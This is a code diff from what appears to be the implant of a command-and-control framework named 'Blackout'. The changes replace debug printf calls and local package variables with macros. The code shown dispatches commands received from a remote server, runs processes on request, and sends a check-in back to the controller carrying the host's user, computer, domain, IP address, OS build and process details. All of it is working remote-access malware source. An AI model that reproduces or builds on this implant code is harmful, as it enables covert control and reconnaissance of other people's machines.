@@ -14,7 +14,7 @@ FUNC VOID CommandDispatcher(
     SIZE_T   DataSize    = 0;
     DWORD    TaskCommand = 0;
 
-    Instance()->Win32.printf( "Command Dispatcher...\n" );
+    BK_PRINT( "Command Dispatcher...\n" );
 
     do
     {
@@ -36,12 +36,12 @@ FUNC VOID CommandDispatcher(
 
                 if ( TaskCommand != COMMAND_NO_JOB )
                 {
-                    Instance()->Win32.printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
+                    BK_PRINT( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );
 
                     BOOL FoundCommand = FALSE;
                     for ( UINT32 FunctionCounter = 0; FunctionCounter < BLACKOUT_COMMAND_LENGTH; FunctionCounter++ )
                     {
-                        Instance()->Win32.printf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, Instance()->Commands[ FunctionCounter ].ID );
+                        BK_PRINT( "Task => CommandID:[%lu : %lx]\n", TaskCommand, Instance()->Commands[ FunctionCounter ].ID );
                         if ( Instance()->Commands[ FunctionCounter ].ID == TaskCommand )
                         {
                             Instance()->Commands[ FunctionCounter ].Function( &Parser );
@@ -51,9 +51,9 @@ FUNC VOID CommandDispatcher(
                     }
 
                     if ( ! FoundCommand )
-                        Instance()->Win32.printf( "Command not found !!\n" );
+                        BK_PRINT( "Command not found !!\n" );
 
-                } else Instance()->Win32.printf( "Is COMMAND_NO_JOB\n" );
+                } else BK_PRINT( "Is COMMAND_NO_JOB\n" );
 
             } while ( Parser.Length > 4 );
 
@@ -65,7 +65,7 @@ FUNC VOID CommandDispatcher(
         }
         else
         {
-            Instance()->Win32.printf( "Transport: Failed\n" );
+            BK_PRINT( "Transport: Failed\n" );
             break;
         }
 
@@ -79,7 +79,7 @@ FUNC VOID CommandRun(
 ) {
     BLACKOUT_INSTANCE
 
-    PPACKAGE Package       = PackageCreate( COMMAND_RUN );
+    BK_PACKAGE = PackageCreate( COMMAND_RUN );
     PSTR     ProcCmd       = ParserGetString( Parser, NULL );
     DWORD    ProcessId     = 0;
     DWORD    ThreadId      = 0;
@@ -91,10 +91,10 @@ FUNC VOID CommandRun(
     if ( !bCheck )
         return;
 
-    PackageAddBool( Package, bCheck );
-    PackageAddInt32( Package, ProcessId );
-    PackageAddInt32( Package, ThreadId );
-    PackageTransmit( Package, NULL, NULL );
+    PackageAddBool( BK_PACKAGE, bCheck );
+    PackageAddInt32( BK_PACKAGE, ProcessId );
+    PackageAddInt32( BK_PACKAGE, ThreadId );
+    PackageTransmit( BK_PACKAGE, NULL, NULL );
 }
 
 FUNC VOID CommandCheckin(
@@ -102,34 +102,34 @@ FUNC VOID CommandCheckin(
 ) {
     BLACKOUT_INSTANCE
 
-    PPACKAGE Package = PackageCreate( BLACKOUT_CHECKIN );
+    BK_PACKAGE = PackageCreate( BLACKOUT_CHECKIN );
 
-    PackageAddInt32( Package, Instance()->Base.Buffer  );
-    PackageAddInt32( Package, Instance()->Base.Length  );
-    PackageAddInt32( Package, Instance()->Base.FullLen );
-    PackageAddInt32( Package, Instance()->Base.RxBase  );
-    PackageAddInt32( Package, Instance()->Base.RxSize  );
+    PackageAddInt32( BK_PACKAGE, Instance()->Base.Buffer  );
+    PackageAddInt32( BK_PACKAGE, Instance()->Base.Length  );
+    PackageAddInt32( BK_PACKAGE, Instance()->Base.FullLen );
+    PackageAddInt32( BK_PACKAGE, Instance()->Base.RxBase  );
+    PackageAddInt32( BK_PACKAGE, Instance()->Base.RxSize  );
 
-    PackageAddWString( Package, Instance()->Session.ProcessName     );
-    PackageAddWString( Package, Instance()->Session.ProcessFullPath );
-    PackageAddWString( Package, Instance()->Session.ProcessCmdLine  );
-    PackageAddInt32(   Package, Instance()->Session.ProcessId       );
-    PackageAddInt32(   Package, Instance()->Session.ParentProcId    );
+    PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessName     );
+    PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessFullPath );
+    PackageAddWString( BK_PACKAGE, Instance()->Session.ProcessCmdLine  );
+    PackageAddInt32(   BK_PACKAGE, Instance()->Session.ProcessId       );
+    PackageAddInt32(   BK_PACKAGE, Instance()->Session.ParentProcId    );
 
-    PackageAddString( Package, Instance()->System.UserName      );
-    PackageAddString( Package, Instance()->System.ComputerName  );
-    PackageAddString( Package, Instance()->System.DomainName    );
-    PackageAddString( Package, Instance()->System.NetBios       );
-    PackageAddString( Package, Instance()->System.IpAddress     );
-    PackageAddInt32(  Package, Instance()->System.OsArch        );
-    PackageAddInt32(  Package, Instance()->System.ProductType   );
-    PackageAddInt32(  Package, Instance()->System.OsMajorV      );
-    PackageAddInt32(  Package, Instance()->System.OsMinorv      );
-    PackageAddInt32(  Package, Instance()->System.OsBuildNumber );
+    PackageAddString( BK_PACKAGE, Instance()->System.UserName      );
+    PackageAddString( BK_PACKAGE, Instance()->System.ComputerName  );
+    PackageAddString( BK_PACKAGE, Instance()->System.DomainName    );
+    PackageAddString( BK_PACKAGE, Instance()->System.NetBios       );
+    PackageAddString( BK_PACKAGE, Instance()->System.IpAddress     );
+    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsArch        );
+    PackageAddInt32(  BK_PACKAGE, Instance()->System.ProductType   );
+    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsMajorV      );
+    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsMinorv      );
+    PackageAddInt32(  BK_PACKAGE, Instance()->System.OsBuildNumber );
 
-    PackageAddWString( Package, Instance()->Transport.Host      );
-    PackageAddInt32(   Package, Instance()->Transport.Port      );
-    PackageAddWString( Package, Instance()->Transport.UserAgent );
+    PackageAddWString( BK_PACKAGE, Instance()->Transport.Host      );
+    PackageAddInt32(   BK_PACKAGE, Instance()->Transport.Port      );
+    PackageAddWString( BK_PACKAGE, Instance()->Transport.UserAgent );
 
-    PackageTransmit( Package, NULL, NULL );
+    PackageTransmit( BK_PACKAGE, NULL, NULL );
 }
